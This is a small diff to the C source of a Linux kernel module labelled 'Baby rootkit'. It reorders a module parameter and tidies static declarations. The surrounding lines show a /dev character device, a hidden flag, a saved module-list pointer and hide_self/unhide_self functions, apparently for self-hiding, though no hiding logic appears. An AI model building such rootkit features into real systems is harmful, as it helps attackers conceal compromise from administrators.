@@ -15,21 +15,20 @@ MODULE_LICENSE("GPL v2");
 MODULE_DESCRIPTION("Baby rootkit");
 MODULE_VERSION("0.1");
 
+module_param(filename, charp, 0000);
+MODULE_PARM_DESC(filename, "Filename in /dev");
+
 static char* filename = THIS_MODULE->name;
 static char* msg_ptr;
 static char msg[BUFF_LEN];
-module_param(filename, charp, 0000);
-MODULE_PARM_DESC(filename, "Filename in /dev");
 static int major = -1;
 static struct cdev mycdev;
 static struct class *myclass = NULL;
 static struct list_head * prev;
 static int hidden = 0;
-
 static char status_str[BUFF_LEN];
 static char * status_str_ptr;
-
-int device_open_count = 0;
+static int device_open_count = 0;
 
 static int hide_self(void);
 static int unhide_self(void);
